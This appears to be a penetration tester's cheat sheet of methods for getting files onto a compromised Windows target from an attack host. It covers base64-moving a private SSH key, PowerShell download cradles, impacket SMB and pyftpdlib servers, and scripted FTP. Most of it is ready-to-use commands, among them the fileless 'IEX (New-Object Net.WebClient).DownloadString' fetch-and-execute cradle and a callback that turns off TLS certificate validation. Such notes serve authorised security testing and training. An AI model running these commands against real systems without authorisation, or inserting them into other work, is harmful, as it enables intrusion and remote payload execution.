---
title: Windows File Transfers — Downloads
tags: [file-transfer, windows, powershell, smb, ftp]
---

# Windows File Transfers — Downloads
> Methods to transfer files **onto** a Windows target from your attack host.

---

## Base64 Encode / Decode

Useful when no direct file transfer is possible — encode on Linux, decode on Windows.

```bash
# Linux — verify integrity before transfer
md5sum id_rsa

# Linux — encode to base64
cat id_rsa | base64 -w 0; echo
```

```powershell
# Windows — decode and write file
[IO.File]::WriteAllBytes("C:\Users\Public\id_rsa", [Convert]::FromBase64String("<b64string>"))

# Windows — verify integrity after transfer
Get-FileHash C:\Users\Public\id_rsa -Algorithm MD5
```

!!! warning
    `cmd.exe` has a maximum string length of 8,191 characters. For large files, base64 transfer via the command line will fail. Web shells may also error on extremely large strings.

---

## PowerShell Web Downloads

PowerShell's `System.Net.WebClient` class supports HTTP, HTTPS, and FTP downloads.

### DownloadFile
```powershell
# Synchronous
(New-Object Net.WebClient).DownloadFile('<URL>', '<OutFile>')

# Async
(New-Object Net.WebClient).DownloadFileAsync('<URL>', '<OutFile>')
```

### DownloadString — Fileless (Execute in Memory)
```powershell
# Execute directly without writing to disk
IEX (New-Object Net.WebClient).DownloadString('<URL>')

# Pipeline variant
(New-Object Net.WebClient).DownloadString('<URL>') | IEX
```

### Invoke-WebRequest
```powershell
Invoke-WebRequest <URL> -OutFile <file>
```

### Common Errors & Fixes

```powershell
# IE first-launch config not completed — use -UseBasicParsing
Invoke-WebRequest <URL> -UseBasicParsing | IEX

# Untrusted SSL/TLS certificate
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
```

!!! tip
    More PowerShell download cradles: [HarmJ0y's Gist](https://gist.github.com/HarmJ0y/bb48307ffa663256e239)

---

## SMB Downloads

Set up an SMB server on the attack host, then use `copy` or `Copy-Item` on the target.

```bash
# Attack host — start SMB server (no auth)
sudo impacket-smbserver share -smb2support /tmp/smbshare

# Attack host — start SMB server (with auth, if unauthenticated is blocked)
sudo impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

```powershell
# Target — copy file directly
copy \\<IP>\share\<file>

# Target — mount first, then copy (if guest access is blocked)
net use n: \\<IP>\share /user:test test
copy n:\<file>
```

!!! tip
    If `copy \\IP\sharename` fails, mount the share first with `net use` then copy from the drive letter.

---

## FTP Downloads

```bash
# Attack host — install and start FTP server
sudo pip3 install pyftpdlib
sudo python3 -m pyftpdlib --port 21
```

```powershell
# Target — download via PowerShell
(New-Object Net.WebClient).DownloadFile('ftp://<IP>/<file>', 'C:\Users\Public\<file>')
```

### Non-Interactive FTP (no shell)
When you don't have a full interactive shell, use a command file:

```powershell
echo open <IP> > ftpcommand.txt
echo USER anonymous >> ftpcommand.txt
echo binary >> ftpcommand.txt
echo GET <file> >> ftpcommand.txt
echo bye >> ftpcommand.txt
ftp -v -n -s:ftpcommand.txt
```
